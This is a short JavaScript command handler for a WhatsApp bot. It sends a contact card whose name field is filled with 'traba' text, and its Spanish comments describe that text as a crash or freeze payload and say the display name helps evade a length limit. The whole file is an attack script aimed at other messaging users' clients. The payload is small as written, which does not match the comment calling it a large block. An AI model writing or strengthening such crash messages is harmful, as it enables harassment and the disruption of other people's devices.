let handler = async (m, { conn }) => {
  const number = '521234567890'; // Número del contacto
  const basura = '꧅+𝑩𝑨𝑺𝑼𝑹𝑨꧅'.repeat(1); // Un bloque grande de traba
  const trabaFinal = basura + basura + basura; // Repetimos 3 veces

  const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:${trabaFinal}
TEL;type=CELL;type=VOICE;waid=${number}:${number}
END:VCARD
  `.trim();

  await conn.sendMessage(m.chat, {
    contacts: {
      displayName: basura + '+' + basura + '+' + basura, // visible, pero ayuda a eludir límite
      contacts: [{ vcard }]
    }
  }, { quoted: m });
};

handler.command = /^contacto$/i;
export default handler;